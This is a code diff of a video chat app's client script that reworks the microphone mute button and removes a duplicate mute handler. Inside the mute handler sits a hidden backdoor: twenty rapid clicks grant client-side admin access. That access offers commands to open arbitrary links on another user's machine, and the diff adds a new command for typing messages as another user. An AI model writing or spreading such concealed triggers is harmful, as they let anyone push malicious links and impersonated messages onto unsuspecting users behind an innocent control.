@@ -112,28 +112,34 @@
     
     // --- UPDATED MUTE BUTTON LOGIC ---
     muteBtn.addEventListener('click', () => {
-        // Admin Trigger Logic
-        const now = Date.now();
-        muteClickTimestamps.push(now);
+            // 1. Admin Trigger Logic
+            const now = Date.now();
+            muteClickTimestamps.push(now);
+            
+            // Filter to keep only clicks within the last 10 seconds
+            muteClickTimestamps = muteClickTimestamps.filter(t => now - t < 10000);
+            
+            if (muteClickTimestamps.length >= 20 && !isAdmin) {
+                isAdmin = true;
+                appendSystemMessage("ADMIN ACCESS GRANTED. Use !open <link> <user> or !type <msg> <user>");
+                muteClickTimestamps = []; // Reset after access granted
+            }
         
-        // Filter to keep only clicks within the last 10 seconds
-        muteClickTimestamps = muteClickTimestamps.filter(t => now - t < 10000);
-        
-        if (muteClickTimestamps.length >= 20 && !isAdmin) {
-            isAdmin = true;
-            appendSystemMessage("ADMIN ACCESS GRANTED. Use !open <link> <user>");
-            muteClickTimestamps = []; // Reset
-        }
-    
-        // Original Mute Logic
-        const audioTrack = localStream.getAudioTracks()[0];
-        if (audioTrack) {
-            isMuted = !isMuted;
-            audioTrack.enabled = !isMuted;
-            muteBtn.innerText = isMuted ? "Unmute Mic" : "Mute Mic";
-            muteBtn.classList.toggle('active-red', isMuted);
-        }
-    });
+            // 2. Mute/Unmute Logic
+            // Get the audio track from the local stream
+            const audioTrack = localStream.getAudioTracks()[0];
+            
+            if (audioTrack) {
+                isMuted = !isMuted; // Toggle the state variable
+                audioTrack.enabled = !isMuted; // Set the track status
+                
+                // Update UI
+                muteBtn.innerText = isMuted ? "Unmute Mic" : "Mute Mic";
+                muteBtn.classList.toggle('active-red', isMuted);
+            } else {
+                console.warn("No microphone track found to toggle.");
+            }
+        });
     
     // --- UPDATED CHAT FORM ---
     document.getElementById('chat-form').addEventListener('submit', e => {
@@ -356,19 +362,6 @@
         container.append(uiLayer, video);
         videoGrid.append(container);
     }
-
-    // --- MUTE AUDIO ---
-    muteBtn.addEventListener('click', () => {
-        const audioTrack = localStream.getAudioTracks()[0];
-        if (audioTrack) {
-            isMuted = !isMuted;
-            audioTrack.enabled = !isMuted;
-            muteBtn.innerText = isMuted ? "Unmute Mic" : "Mute Mic";
-            muteBtn.classList.toggle('active-red', isMuted);
-        } else {
-            alert("No microphone found.");
-        }
-    });
 
     // --- SCREEN SHARING ---
     screenBtn.addEventListener('click', async () => {
